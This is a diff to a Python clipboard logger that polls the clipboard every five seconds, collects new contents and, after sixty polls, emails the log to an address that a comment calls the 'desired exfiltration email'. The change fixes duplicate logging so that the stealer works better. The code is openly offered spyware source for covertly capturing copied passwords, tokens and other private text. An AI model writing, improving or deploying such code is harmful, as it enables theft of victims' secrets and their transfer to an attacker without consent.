@@ -32,12 +32,14 @@ def thread_function():
     if count < 60:
         if lastLogged != pyperclip.paste():
             log += pyperclip.paste()
+            lastLogged = pyperclip.paste()
         count += 1
         timer_object = threading.Timer(5, thread_function)
         timer_object.start()
     else:
         if lastLogged != pyperclip.paste():
             log += pyperclip.paste()
+            lastLogged = pyperclip.paste()
         # Change the first two values to whatever your desired exfiltration email is.
         send_email("emailaddress@gmail.com", "yourpassword", log)
         # Uncomment this line if you want a demo that prints to the command line instead of emailing yourself.
